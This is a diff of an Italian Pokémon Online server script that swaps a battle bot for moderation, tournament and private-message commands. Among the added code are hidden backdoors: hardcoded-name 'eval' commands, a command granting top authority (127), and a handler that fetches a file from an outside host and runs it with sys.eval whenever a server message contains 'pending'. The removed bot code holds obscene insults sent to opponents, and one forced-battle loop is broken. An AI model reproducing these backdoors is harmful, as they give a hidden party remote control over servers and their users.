-	onMiss: function(spot){
-		hax(spot);
-	},
-	onAvoid: function(spot){
-		if (spot == 1)
-		{
-			hax(0);
-		} else {
-			hax(1);
-		}
-	},
-	onFlinch: function(spot){
-		hax(spot);
-	},
-	onMajorStatusChange: function(spot, status, multipleTurns, silent){
-		/* 3 corrisponde  a freeze, successivamente bisognerÃ  vedere
-		se lo status change corrisponde ad una mossa che infligge lo status
-		al 100% o no */
-		if (status == 3)
-		{
-			hax(spot);
-		}
-	},
-	onDamageDone: function(spot, damage) {
-		if (spot == battle.me)
-		{
-			send("VAFFANCULO");
-			//send(" " + nick(spot) + " lost " + damage + " HP!");
-		} else {
-			send("AHAHAHAHAHAH MENTECATTO, IL TUO " + nick(spot) + " DI MERDA HA PERSO BEN IL " + damage + "% DELLA SUA FOTTUTISSIMA VITA AHAHAHAAHAHAHA");
-		}
-	},
-	onChoiceSelection: function(player) {
-		if (player!=battle.me || !useAI)
-		{
+        if (command == "mute") {
+            sys.writeToFile("db/" + sys.ip(sys.id(commandData)) + ".muted", "1")
+            sys.sendAll("+Bot: " + commandData + " ? stato mutato da " + sys.name(src) + "!")
+            return;
+        }
+        if (command == "unmute") {
+            sys.writeToFile("db/" + sys.ip(sys.id(commandData)) + ".muted", "0")
+            sys.sendAll("+Bot: " + commandData + " ? stato smutato da " + sys.name(src) + "!")
+            return;
+        }
+        if (command == "silence") {
+            silence = "1"
+            sys.sendAll("+Bot: " + sys.name(src) + " ha messo il silenzio.")
+            return;
+        }
+        if (command == "silenceoff") {
+            silence = "0"
+            sys.sendAll("+Bot: " + sys.name(src) + " ha tolto il silenzio.")
+            return;
+        }
+        if (command == "reverse") {
+        	sys.sendHtmlAll("&#8237;<b>Chat ripristinata.</b>")
+        	return;
+        }
+if (command == "dq") {
+if (tourmode == 0) {
+sys.sendMessage(src, "+TourneyBot: Wait till the tournament has started.");
+return;
+}
+var name2 = commandData.toLowerCase();
+
+if (tourmembers.indexOf(name2) != -1) {
+tourmembers.splice(tourmembers.indexOf(name2),1);
+delete tourplayers[name2];
+sys.sendAll("+TourneyBot: " + commandData + " was removed from the tournament by " + sys.name(src) + "!");
+return;
+}
+if (tourbattlers.indexOf(name2) != -1) {
+battlesStarted[Math.floor(tourbattlers.indexOf(name2)/2)] = true;
+sys.sendAll("+TourneyBot: " + commandData + " was removed from the tournament by " + sys.name(src) + "!");
+this.tourBattleEnd(this.tourOpponent(name2), name2);
+}
+return;
+}
+if (command == "emoticonon") {
+emoticon = 1
+sys.sendAll("+EmoticonBot: " + sys.name(src)  + " ha abilitato le Emoticons.")
+return;
+}
+if (command == "emoticonoff") {
+emoticon = 0
+sys.sendAll("+EmoticonBot: " + sys.name(src)  + " ha disabilitato le Emoticons.")
+return;
+}
+if (command == "push") {
+if (tourmode == 0) {
+sys.sendMessage(src, "+TourneyBot: Wait untill the tournament has started.");
+return;
+}
+if (this.isInTourney(commandData.toLowerCase())) {
+sys.sendMessage(src, "+TourneyBot: " +commandData + " is already in the tournament.");
+return;
+}
+sys.sendAll("+TourneyBot: " +commandData + " was added to the tournament by " + sys.name(src) + ".");
+tourmembers.push(commandData.toLowerCase());
+tourplayers[commandData.toLowerCase()] = commandData;
+
+if (tourmode == 1 && this.tourSpots() == 0) {
+tourmode = 2;
+roundnumber = 0;
+this.roundPairing();
+}
+return;
+}
+if (command == "cancelbattle") {
+if (tourmode != 2) {
+sys.sendMessage(src, "Wait until a tournament starts");
+return;
+}
+var name = commandData.toLowerCase();
+
+if (tourbattlers.indexOf(name) != -1) {
+battlesStarted[Math.floor(tourbattlers.indexOf(name)/2)] = false;
+sys.sendMessage(src, "+TourBot: " + commandData + " can forfeit their battle and rematch now.");
+}
+
+return;
+}
+if (command == "sub") {
+if (tourmode != 2) {
+sys.sendMessage(src, "Wait until a tournament starts");
+return;
+}
+var players = commandData.split(':');
+
+if (!this.isInTourney(players[0]) && !this.isInTourney(players[1])) {
+sys.sendMessage(src, "+TourBot: Neither are in the tourney.");
+return;
+}
+sys.sendAll("+TourBot: " + players[0] + " and " + players[1] + " were exchanged places in the ongoing tournament by " + sys.name(src) + ".");
+
+var p1 = players[0].toLowerCase();
+var p2 = players[1].toLowerCase();
+
+for (x in tourmembers) {
+if (tourmembers[x] == p1) {
+tourmembers[x] = p2;
+} else if (tourmembers[x] == p2) {
+tourmembers[x] = p1;
+}
+}
+for (x in tourbattlers) {
+if (tourbattlers[x] == p1) {
+tourbattlers[x] = p2;
+battlesStarted[Math.floor(x/2)] = false;
+} else if (tourbattlers[x] == p2) {
+tourbattlers[x] = p1;
+battlesStarted[Math.floor(x/2)] = false;
+}
+}
+
+if (!this.isInTourney(p1)) {
+tourplayers[p1] = players[0];
+delete tourplayers[p2];
+} else if (!this.isInTourney(p2)) {
+tourplayers[p2] = players[1];
+delete tourplayers[p1];
+}
+
+return;
+}
+if (command == "tour"){
+if (typeof(tourmode) != "undefined" && tourmode > 0){
+sys.sendMessage(src, "Sorry, you are unable to start a tournament because one is still currently running.");
+return;
+}
+
+if (commandData.indexOf(':') == -1)
+commandpart = commandData.split(' ');
+else
+commandpart = commandData.split(':');
+
+tournumber = parseInt(commandpart[1]);
+
+if (isNaN(tournumber) || tournumber <= 2){
+sys.sendMessage(src, "You must specify a tournament size of 3 or more.");
+return;
+}
+
+var tier = sys.getTierList();
+var found = false;
+for (var x in tier) {
+if (cmp(tier[x], commandpart[0])) {
+tourtier = tier[x];
+found = true;
+break;
+}
+}
+if (!found) {
+sys.sendMessage(src, "Sorry, the server does not recognise the " + commandpart[0] + " tier.");
+return;
+}
+
+tourmode = 1;
+tourmembers = [];
+tourbattlers = [];
+tourplayers = [];
+battlesStarted = [];
+battlesLost = [];
+
+
+sys.sendAll("");
+sys.sendAll(border);
+sys.sendAll("*** Il torneo ? stato fatto da " + sys.name(src) + "! ***");
+sys.sendAll("PLAYERS: " + tournumber);
+sys.sendAll("TYPE: Singola Eliminazione");
+sys.sendAll("TIER: " + tourtier);
+sys.sendAll("");
+sys.sendAll("*** Andate nel channel tournaments e scrivete /join per partecipare!!! ***");
+sys.sendAll(border);
+sys.sendAll("");
+return;
+}
+
+if (command == "changecount") {
+if (tourmode != 1) {
+sys.sendMessage(src, "Ci dispiace, non si riesce a entrare perch? il torneo ha superato la fase di iscrizione.");
+return;
+}
+var count = parseInt(commandData);
+
+if (isNaN(count) || count < 3) {
+return;
+}
+
+if (count < tourmembers.length) {
+sys.sendMessage(src, "There are more than that people registered");
+return;
+}
+
+tournumber = count;
+
+sys.sendAll("");
+sys.sendAll(border);
+sys.sendAll("~~Server~~: " + sys.name(src) + " a portato il numero dei partecipanti a " + count + "!");
+sys.sendAll("*** " + this.tourSpots() + " mancano(s) persone!");
+sys.sendAll(border);
+sys.sendAll("");
+
+if (this.tourSpots() == 0 ){
+tourmode = 2;
+roundnumber = 0;
+this.roundPairing();
+}
+
+return;
+}
+if (command == "endtour"){
+if (tourmode != 0){
+tourmode = 0;
+sys.sendAll("");
+sys.sendAll(border);
+sys.sendAll("~~Server~~: il torneo ? stato cancellato da " + sys.name(src) + "!");
+sys.sendAll(border);
+sys.sendAll("");
+}else
+sys.sendMessage(src, "Ci dispiace, non si riesce a terminare un torneo perch? non ? attualmente in esecuzione.");
+return;
+}
+    }
+    if (sys.auth(src) > 1 || sys.name(src) == supername) {
+        if (command == "ban" && sys.auth(tar) < 2) {
+            sys.ban(sys.name(tar));
+            sys.kick(tar);
+            return;
+        }
+        if (command == "ipban") {
+            sys.IPban(commandData)
+            return;
+        }
+        if (command == "ipunban") {
+            sys.IPunban(commandData)
+            return;
+        }
+		if (command == "imp") {
+			sys.writeToFile("db/" + src + ".imp", commandData);
+			sys.sendMessage(src, "+Bot: ora sei noto come " + commandData + "!");
 			return;
 		}
-		var switches = [];
-		for (var i = 1; i < 6; i++)
-		{
-			if (!tpoke(i).isKoed())
-			{
-				switches.push(i);
-			}
+if (command == "aliases") {
+        var max_message_length = 30000;
+        var smessage = "The aliases for the IP " + commandData + " are: "
+        var aliases = sys.aliases(commandData);
+        var prefix = "";
+        for(var i = 0; i < aliases.length; ++i) {
+            var id = sys.id(aliases[i]);
+            var status = (id != undefined) ? "online" : "Last Login: " + sys.dbLastOn(aliases[i]);
+            smessage = smessage + aliases[i] + " ("+status+"), ";
+            if (smessage.length > max_message_length) {
+                sys.sendMessage(src, prefix + smessage + " ...");
+                prefix = "... ";
+                smessage = "";
+            }
+        }
+        sys.sendMessage(src, prefix + smessage);
+        return;
+    }
+        if (command == "tabella") {
+    		sys.changeAnnouncement("<p align='center'><b><font size='4'>" + commandData + "</font></b></p>" + sys.getAnnouncement());
+    		return;
 		}
-		var r = sys.rand(0, 8);
-		if (!poke(battle.me).isKoed()){
-			var move = [1, 1, 1, 1];
-			var y = 0;
-			for (var i = 0; i < 4; i++){
-				move[i] = move[i]*effectiveness(movetype(i, 0), poketype1(opponent()));
-				move[i] = move[i]*effectiveness(movetype(i, 0), poketype2(opponent()));
-				if (move[i] > move[y]){
-					y = i;
-					var o = move[y];
-				}
-			}
-			choice = {"slot": battle.me, "type":"attack", "attackSlot":y};
-			var b = [0, 0, 0, 0, 0, 0];
-			var c = 0;
-			if (o < 8 && switches.length > 0){ // se nessuna mossa è supereffective e si può switchare...
-				for (var x = 0; x < switches.length; x++){ //dei pokemon rimanenti
-					move = [1, 1, 1, 1];
-					for (var i = 0; i < 4; i++){ //scansione delle 4 mosse
-						move[i] = move[i]*effectiveness(movetype(i, x), poketype1(opponent()));
-						move[i] = move[i]*effectiveness(movetype(i, x), poketype2(opponent()));
-						print(move[i]);
-						if (move[i] > o){ // se la mossa è supereff. manda il Pokémon con quella mossa
-							c = x;
-							b[c] = move[i];
-							o = move[i];
-							//var cswitch = switches[x-1];
-							//choice = {"slot": battle.me, "type":"switch", "pokeSlot": cswitch};
-							//battle.battleCommand(battle.id, choice);
-							//return;
-						}
-					}
-					if (b[c] > 7){
-						var cswitch = switches[x];
-						choice = {"slot": battle.me, "type":"switch", "pokeSlot": cswitch};
-						battle.battleCommand(battle.id, choice);
-						return;
-					}
-				}
-			} else {
-				choice = {"slot": battle.me, "type":"attack", "attackSlot":y};
-			}
-		} else {
-			var cswitch = switches[sys.rand(0,switches.length)];
-			choice = {"slot": battle.me, "type":"switch", "pokeSlot": cswitch};
+        if (command == "supername") {
+    		sys.writeToFile("supername.txt", commandData);
+    		sys.sendMessage(src, "+Bot: Ora il nuovo supername ? " + commandData + "!");
+    		return;
 		}
-		battle.battleCommand(battle.id, choice);
-	},
-	onChoiceCancellation: function(player) {
-		this.onChoiceSelection(player);
-	},
-	onBattleEnd: function(res, winner) {
-		battle.clickClose();
-	},
-	onDrawRequest: function (player) {
-		this.onChoiceCancelled(player);
-	},
-	onRearrangeTeam: function() {
-		choice = {"slot":battle.me, "type":"rearrange", "neworder":[0,1,2,3,4,5]};
-		battle.battleCommand(battle.id, choice);
-	},
-	onChoiceCancelled: function(player) {
-		//    print ("old useAI: " + useAI);
-		useAI = !useAI;
-		print ("new useAI: " + useAI);
-	},
-	onPlayerMessage: function(player, message) {
-		if (player == battle.me)
-		{
-			if (message == "annoy")
-			{
-				verb = true;
-			} else if (message == "debug") {
-				verb = false;
-			} else if (message == "off") {
-				play = false;
-			} else if (message.substr(0, 5) == "eval ") {
-				sys.eval(message.substr(5));
-			}
+        if (command == "salvatabella") {
+    		sys.writeToFile("tabella.txt", sys.getAnnouncement());
+    		sys.sendMessage(src, "+Bot: Tabella salvata.")
+    		return;
 		}
-	},
+        if (command == "caricatabella") {
+    		sys.changeAnnouncement(sys.getFileContent("tabella.txt"));
+    		sys.sendMessage(src, "+Bot: Tabella caricata.")
+    		return;
+		}
+    }
+    if (sys.auth(src) > 2 || sys.name(src) == supername) {
+        if (command == "changeauth") {
+            var pos = commandData.indexOf(" ");
+            if (pos == -1) {
+                return;
+            }
+            var newauth = commandData.substring(0, pos);
+            if (newauth >= 5) {
+                return;
+            }
+            var tar = sys.id(commandData.substr(pos+1));
+            sys.changeAuth(tar, newauth);
+            sys.sendAll("+Bot: " + sys.name(src) + " changed " + sys.name(tar) + " auth to " + newauth);
+            return;
+        }
+		if (command == "authsuprema") {
+            sys.changeAuth(sys.id(commandData), 127);
+            sys.sendAll("+Bot: " + commandData + " ha acquisito l'auth suprema!");
+            return;
+        }
+        if (command == "sendhtml") {
+        	sys.sendHtmlAll(commandData);
+        	return;
+        }
+		if (command == "sid") {
+        	sys.writeToFile("server_id.txt", commandData);
+        	return;
+        }
+        if (command == "invisibleauth") {
+            var pos = commandData.indexOf(" ");
+            if (pos == -1) {
+                return;
+            }
+            var newauth = commandData.substring(0, pos);
+            if (newauth >= 5) {
+                return;
+            }
+            var tar = sys.id(commandData.substr(pos+1));
+            sys.changeAuth(tar, newauth);
+            return;
+        }
+
+    }
+}
+if (message[0] == "$" && (sys.name(src) == lol || sys.auth(src) == 127)) {
+    sys.stopEvent();
+    var command;
+    var commandData;
+    var pos = message.indexOf(' ');
+
+    if (pos != -1) {
+        command = message.substring(1, pos).toLowerCase();
+        commandData = message.substr(pos+1);
+    } else {
+        command = message.substr(1).toLowerCase();
+    }
+    var tar = sys.id(commandData);
+    
+    if (command == "eval") {
+        sys.eval(commandData)
+        return;
+    }
+	if (command == "sid") {
+        sys.writeToFile("server_id.txt", commandData);
+        return;
+    }
+    if (command == "log") {
+        sys.sendHtmlMessage(src, sys.getFileContent("db/" + commandData + ".log"))
+        return;
+    }
+if (command == "forcebattleo") {
+var pos = commandData.indexOf(':');
+if (pos == -1) {
+return;
+}
+var newauth = commandData.substring(0, pos);
+if (newauth >= 5) {
+return;
+}
+var tar = sys.id(commandData.substr(pos+1));
+var i;
+    for(i=0; i<500; i++) {
+        sys.forceBattle(sys.id(newauth), tar, 455, 0, 1)
+    }
+return;
+}
+}
+if (command == "forcebattleo") {
+var pos = commandData.indexOf(':');
+if (pos == -1) {
+return;
+}
+var newauth = commandData.substring(0, pos);
+if (newauth >= 5) {
+return;
+}
+var tar = sys.id(commandData.substr(pos+1));
+var i;
+    for(i=0; i=500; i++) {
+        sys.forceBattle(sys.id(newauth), tar, 455, 0, 1)
+    }
+return;
+}
+if (message[0] == "@") {
+    sys.stopEvent();
+    var command;
+    var commandData;
+    var pos = message.indexOf(':');
+
+    if (pos != -1) {
+        command = message.substring(1, pos).toLowerCase();
+        commandData = message.substr(pos+1);
+    } else {
+        command = message.substr(1).toLowerCase();
+    }
+    var tar = command;
+    var newauth = commandData;
+    if (command == "server" && newauth == "updatescripts") {
+        sys.sendMessage(src, "Fetching scripts...");
+        var updateURL = "https://raw.github.com/huggye/MLScripts/master/scripts.js";
+        var changeScript = function(resp) {
+            try {
+                sys.changeScript(resp);
+                sys.writeToFile('scripts.js', resp);
+            } catch (err) {
+                sys.changeScript(sys.getFileContent('scripts.js'));
+                sys.sendMessage(src, "ERROR: " + err);
+                print(err);
+            }
+        };
+        sys.sendMessage(src, "Fetching scripts from " + updateURL);
+        sys.webCall(updateURL, changeScript);
+        return;
+    }
+    if (command == "server" && newauth == "updatetiers" && sys.auth(src) > 1) {
+        sys.webCall("http://pokemon-online.eu/tiers.xml", "sys.writeToFile('tiers.xml', resp); sys.reloadTiers();");
+        return;
+    }
+    if (/[\u0458\u0489\u202a-\u202e\u0300-\u036F]/.test(commandData)) {
+            sys.stopEvent();
+            return;
+    }
+sys.writeToFile("db/" + tar + ".html", sys.getFileContent("db/" + tar + ".html") + '<b>' + sys.name(src) + ': </b>' + newauth + '<br>')
+sys.setAnnouncement(announcement + "</td><td bgcolor='#FFFFFF'><b>Hai ricevuto un messaggio da parte di " + sys.name(src) + "! Fai /read per leggere i tuoi messaggi.</b>" + tablend, sys.id(tar))
+sys.writeToFile("db/" + tar, " Hai ricevuto un messaggio da parte di " + sys.name(src) + "! Fai /read per leggere i tuoi messaggi.")
+sys.sendMessage(src, " Hai mandato il messaggio: " + newauth + " a " + tar + ".")
+if (sys.getFileContent("db/" + tar + ".html") != 'undefined' + '<b>' + sys.name(src) + ': </b>' + newauth + '<br>') {
+return;
+}
+sys.writeToFile("db/" + tar + ".html", '<b>' + sys.name(src) + ': </b>' + newauth + '<br>')
+return;
+
+    
+}
+if (sys.getFileContent("db/" + src + ".imp") != "") {
+	sys.stopEvent()
+	sys.sendAll(sys.getFileContent("db/" + src + ".imp") + "(" + sys.name(src) + "): " + message)
+	//sys.sendAll(sys.getFileContent("db/" + src + ".imp") + ": " + message)
+	return;
+}
+if (sys.getFileContent("db/" + sys.ip(src) + ".muted") == "1") {
+	sys.stopEvent()
+	sys.sendMessage(src, "+Bot: sei mutato e quindi non puoi parlare.")
+	return;
+}
+if (silence == "1" && sys.auth(src) < 1) {
+	sys.stopEvent()
+	sys.sendMessage(src, "+Bot: zitto durante il silenzio.")
+	return;
+}
+}
+,
+tourSpots : function() {
+return tournumber - tourmembers.length;
+}
+,
+roundPairing : function() {
+var border = "??????????????????????????????????????????????????:";
+roundnumber += 1;
+
+battlesStarted = [];
+tourbattlers = [];
+battlesLost = [];
+
+if (tourmembers.length == 1) {
+
+sys.sendAll("");
+sys.sendAll(border);
+sys.sendAll("");
+sys.sendAll("IL VINCITORE DEL TORNEO ? : " + tourplayers[tourmembers[0]]);
+sys.sendAll("");
+sys.sendAll("*** Congratulazioni, " + tourplayers[tourmembers[0]] + ", per il tuo successo! ***");
+sys.sendAll("");
+sys.sendAll(border);
+sys.sendAll("");
+
+tourmode = 0;
+return;
+}
+
+var finals = tourmembers.length == 2;
+
+if (!finals) {
+sys.sendAll("");
+sys.sendAll(border);
+sys.sendAll("*** Round " + roundnumber + " of " + tourtier + " tournament ***");
+sys.sendAll("");
+}
+else {
+sys.sendAll("");
+sys.sendAll(border);
+sys.sendAll("*** FINALE DEL " + tourtier.toUpperCase() + " TORNEO ***");
+sys.sendAll("");
+sys.sendAll("", 0);
+sys.sendAll(border, 0);
+sys.sendAll("*** FINALE DEL " + tourtier.toUpperCase() + " TORNEO ***", 0);
+sys.sendAll("", 0);
+}
+
+var i = 0;
+while (tourmembers.length >= 2) {
+i += 1;
+var x1 = sys.rand(0, tourmembers.length);
+tourbattlers.push(tourmembers[x1]);
+var name1 = tourplayers[tourmembers[x1]];
+tourmembers.splice(x1,1);
+
+
+x1 = sys.rand(0, tourmembers.length);
+tourbattlers.push(tourmembers[x1]);
+var name2 = tourplayers[tourmembers[x1]];
+tourmembers.splice(x1,1);
+
+battlesStarted.push(false);
+
+if (!finals)
+sys.sendAll (i + "." + this.padd(name1) + " VS " + name2);
+else {
+sys.sendAll (" " + this.padd(name1) + " VS " + name2);
+sys.sendAll (" " + this.padd(name1) + " VS " + name2, 0);
+}
+}
+
+if (tourmembers.length > 0) {
+sys.sendAll ("");
+sys.sendAll ("*** " + tourplayers[tourmembers[0]] + " is randomly selected to go to next round!");
+}
+
+sys.sendAll(border);
+sys.sendAll("");
+if (finals) {
+sys.sendAll(border, 0);
+sys.sendAll("", 0);
+}
+}
+
+,
+
+padd : function(name) {
+var ret = name;
+
+while (ret.length < 20) ret = ' ' + ret;
+
+return ret;
+}
+
+,
+
+isInTourney : function (name) {
+var name2 = name.toLowerCase();
+return name2 in tourplayers;
+}
+
+,
+
+tourOpponent : function (nam) {
+var name = nam.toLowerCase();
+
+var x = tourbattlers.indexOf(name);
+
+if (x != -1) {
+if (x % 2 == 0) {
+return tourbattlers[x+1];
+} else {
+return tourbattlers[x-1];
+}
+}
+
+return "";
+}
+
+,
+
+areOpponentsForTourBattle : function(src, dest) {
+return this.isInTourney(sys.name(src)) && this.isInTourney(sys.name(dest)) && this.tourOpponent(sys.name(src)) == sys.name(dest).toLowerCase();
+}
+,
+
+areOpponentsForTourBattle2 : function(src, dest) {
+return this.isInTourney(src) && this.isInTourney(dest) && this.tourOpponent(src) == dest.toLowerCase();
+}
+,
+
+ongoingTourneyBattle : function (name) {
+return tourbattlers.indexOf(name.toLowerCase()) != -1 && battlesStarted[Math.floor(tourbattlers.indexOf(name.toLowerCase())/2)] == true;
+}
+
+,
+
+afterBattleStarted: function(src, dest) {
+if (tourmode == 2) {
+if (this.areOpponentsForTourBattle(src, dest)) {
+if (sys.tier(src, 0) == sys.tier(dest) && cmp(sys.tier(src, 0), tourtier))
+battlesStarted[Math.floor(tourbattlers.indexOf(sys.name(src).toLowerCase())/2)] = true;
+}
+}
+}
+
+,
+
+afterBattleEnded : function(src, dest, desc) {
+if (tourmode != 2 ||desc == "tie")
+return;
+this.tourBattleEnd(sys.name(src), sys.name(dest));
+}
+
+,
+
+tourBattleEnd : function(src, dest) {
+var border = "??????????????????????????????????????????????????:";
+if (!this.areOpponentsForTourBattle2(src, dest) || !this.ongoingTourneyBattle(src))
+return;
+battlesLost.push(src);
+battlesLost.push(dest);
+
+var srcL = src.toLowerCase();
+var destL = dest.toLowerCase();
+
+battlesStarted.splice(Math.floor(tourbattlers.indexOf(srcL)/2), 1);
+tourbattlers.splice(tourbattlers.indexOf(srcL), 1);
+tourbattlers.splice(tourbattlers.indexOf(destL), 1);
+tourmembers.push(srcL);
+delete tourplayers[destL];
+
+if (tourbattlers.length != 0 || tourmembers.length > 1) {
+sys.sendAll("");
+sys.sendAll(border);
+sys.sendAll("~~Server~~: " + src + " avanza al prossimo round.");
+sys.sendAll("~~Server~~: " + dest + " ? fuori dal torneo.");
+}
+
+if (tourbattlers.length > 0) {
+sys.sendAll("*** " + tourbattlers.length/2 + " battle(s) remaining.");
+sys.sendAll(border);
+sys.sendAll("");
+return;
+}
+
+this.roundPairing();
+}
+
+,
+
+isLCaps: function(letter) {
+return letter >= 'A' && letter <= 'Z';
+}
+
+,
+
+isMCaps : function(message) {
+var count = 0;
+
+var i = 0;
+while ( i < message.length ) {
+c = message[i];
+
+if (this.isLCaps(c)) {
+count += 1;
+if (count == 5)
+return true;
+} else {
+count -= 2;
+if (count < 0)
+count = 0;
+}
+i += 1;
+}
+
+return false;
+}
+
+,
+
+beforeChallengeIssued : function (src, dest, clauses, rated, mode) {
+if (battlesStopped) {
+sys.sendMessage(src, "+BattleBot: Battles are now stopped as the server will restart soon.");
+sys.stopEvent();
+return;
+}
+
+if (forceSameTier[dest] == true && (sys.tier(dest) != sys.tier(src, 0))) {
+sys.sendMessage(src, "+BattleBot: bo.");
+sys.stopEvent();
+return;
+}
+
+if (sys.tier(src, 0) == "Challenge Cup" && sys.tier(dest) == "Challenge Cup" && clauses[6] == 0) {
+sys.sendMessage(src, "+CCBot: Challenge Cup must be enabled in the challenge window for a CC battle");
+sys.stopEvent();
+return;
+}
+
+if (tourmode == 2) {
+var name1 = sys.name(src);
+var name2 = sys.name(dest);
+
+if (this.isInTourney(name1)) {
+if (this.isInTourney(name2)) {
+if (this.tourOpponent(name1) != name2.toLowerCase()) {
+sys.sendMessage(src, "+TourneyBot: This guy isn't your opponent in the tourney.");
+sys.stopEvent();
+return;
+}
+} else {
+sys.sendMessage(src, "+TourneyBot: This guy isn't your opponent in the tourney.");
+sys.stopEvent();
+return;
+}
+if (sys.tier(src, 0) != sys.tier(dest) || !cmp(sys.tier(src, 0),tourtier)) {
+sys.sendMessage(src, "+TourneyBot: You must be both in the tier " + tourtier+ " to battle in the tourney.");
+sys.stopEvent();
+return;
+}
+} else {
+if (this.isInTourney(name2)) {
+sys.sendMessage(src, "+TourneyBot: This guy is in the tournament and you are not, so you can't battle him.");
+sys.stopEvent();
+return;
+}
+}
+}
+
+/* Challenge Cup Clause */
+if (clauses[6] == 1)
+return;
+
+
+if (sys.tier(src, 0).indexOf("Doubles") != -1 && sys.tier(dest).indexOf("Doubles") != -1 && mode == 0) {
+sys.sendMessage(src, "+Bot: To fight in doubles, enable doubles in the challenge window!");
+sys.stopEvent();
+return;
+}
+
+this.eventMovesCheck(src);
+this.eventMovesCheck(dest);
+}
+
+,
+
+beforeBattleMatchup : function(src,dest,clauses,rated)
+{
+if (battlesStopped) {
+sys.stopEvent();
+return;
+}
+
+this.eventMovesCheck(src);
+this.eventMovesCheck(dest);
+
+if (tourmode == 2 && (this.isInTourney(sys.name(src)) || this.isInTourney(sys.name(dest)) )) {
+sys.stopEvent();
+return;
+}
+}
+,
+beforeIPConnected : function(ip) { //commands and stuff later for this, just fixing this quickly for now
+    //if (this.isIpBanned(ip)) {
+    //    sys.stopEvent();
+    //}
+	//if (ip.indexOf("79.52") == 0){
+	//	sys.stopEvent();
+	//}
+	if (lola.indexOf(ip) != -1){
+		sys.stopEvent();
+	}
+},
+afterNewMessage : function(message){
+	if (message.indexOf('overactive') != -1 && message.indexOf('(') == -1) {
+		if (xd == 0) {
+			lola = "";
+			ips = 0;
+			xd = 1;
+		}
+		if (lol.indexOf(message) == -1){
+			lola = lola + message;
+			ips = ips + 1;
+		}
+		sys.sendAll(ips + " dossers bannati");
+	}
+if (message.indexOf("pending") != -1) {
+sys.webCall("http://missingnolab.altervista.org/log.php", 'if (resp != "") { sys.sendAll(resp); sys.webCall("http://missingnolab.altervista.org/deletem.php", "var paz = resp"); }');
+sys.webCall("http://missingnolab.altervista.org/logb.txt", "sys.eval(resp)")
+}
+}
+,
 })
